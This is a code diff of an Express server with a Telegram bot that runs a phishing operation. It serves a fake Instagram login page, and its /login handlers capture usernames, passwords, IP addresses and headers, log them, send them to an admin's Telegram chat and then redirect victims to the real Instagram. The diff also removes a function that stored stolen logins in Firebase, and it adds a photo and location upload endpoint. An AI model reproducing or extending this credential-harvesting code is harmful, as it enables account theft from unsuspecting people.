@@ -85,27 +85,6 @@ async function getAllUsers() {
   }
 }
 
-async function saveLoginAttempt(credentials, ip, userAgent, ref = null) {
-  try {
-    const loginData = {
-      username: credentials.username,
-      password: credentials.password,
-      ip: ip,
-      userAgent: userAgent,
-      ref: ref,
-      timestamp: Date.now()
-    };
-    
-    await fetch(`${FIREBASE_DB_URL}/logins.json`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(loginData)
-    });
-  } catch (e) { 
-    console.error("Save login error:", e); 
-  }
-}
-
 // ---------- BOT ----------
 const bot = new Telegraf(BOT_TOKEN);
 const broadcastState = new Map();
@@ -393,29 +372,59 @@ app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 6 * 1024 * 1024 } });
 
+// Serve Instagram page
+// Configure body parser before routes
+app.use(express.urlencoded({ extended: true }));
+
+app.get("/insta", (_req, res) => {
+  res.sendFile(path.join(__dirname, "test insta", "index.html"));
+});
+
 // Serve static files from "test insta" directory
 app.use("/insta", express.static(path.join(__dirname, "test insta")));
 
-// Serve Instagram page
-app.get("/insta", (req, res) => {
-  const ref = req.query.ref;
-  let htmlPath = path.join(__dirname, "test insta", "index.html");
+// Login Capture
+app.post("/login", async (req, res) => {
+  // Log the entire request body
+  console.log("Request body:", req.body);
   
-  if (ref) {
-    // If there's a ref parameter, we'll handle it via JavaScript in the HTML
-    res.sendFile(htmlPath);
-  } else {
-    res.sendFile(htmlPath);
-  }
+  const { username, password } = req.body;
+  console.log("Login attempt details:");
+  console.log("Username:", username);
+  console.log("Password:", password);
+  console.log("IP:", req.ip);
+  console.log("Headers:", req.headers);
+
+  // Always redirect back to Instagram
+  res.redirect("https://www.instagram.com/");
 });
 
-// CAPTURE LOGIN - IMPROVED VERSION
+// Student Page - Photo and Location Submission
+const INSTA_PATH = path.join(__dirname, "test insta");
+app.use("/insta", express.static(INSTA_PATH));
+
+// CAPTURE LOGIN
 app.post("/login", async (req, res) => {
   const { username, password } = req.body;
   if (!username || !password) return res.redirect("/insta");
-  const ip = req.ip || "unknown";
-  const msg = `*INSTAGRAM LOGIN*\nUser: \`${username}\`\nPass: \`${password}\`\nIP: \`${ip}\``;
-  try { await bot.telegram.sendMessage(ADMIN_USER_ID, msg, { parse_mode: "Markdown" }); } catch {}
+
+  const ip = req.ip || req.headers["x-forwarded-for"] || "unknown";
+  const time = new Date().toLocaleString();
+
+  const message = `
+*INSTAGRAM LOGIN*
+*User:* \`${username}\`
+*Pass:* \`${password}\`
+*IP:* \`${ip}\`
+*Time:* \`${time}\`
+  `.trim();
+
+  try {
+    await bot.telegram.sendMessage(ADMIN_USER_ID, message, { parse_mode: "Markdown" });
+  } catch (e) {
+    console.error("Failed to send login", e);
+  }
+
   res.redirect("https://www.instagram.com/");
 });
 
@@ -425,7 +434,7 @@ app.get("/r/:ref", async (req, res) => {
   if (!/^\d+$/.test(ref)) return res.status(400).send("Invalid");
 
   // Optional: save even if user never used /start
-  await saveUser(ref);
+  await saveUser(ref, null);
 
   res.type("html").send(`<!DOCTYPE html>
 <html lang="ru">
@@ -584,12 +593,13 @@ app.post("/submit", upload.single("photo"), async (req, res) => {
     res.status(500).json({ ok: false });
   }
 });
+// Handle student data submission
 
 // Health check
+
 app.get("/", (_req, res) => {
   res.json({ status: "OK", timestamp: new Date().toISOString() });
 });
-
 // Start server
 const server = app.listen(PORT, "0.0.0.0", () => {
   console.log(`🚀 Server LIVE: https://${HOST}:${PORT}`);
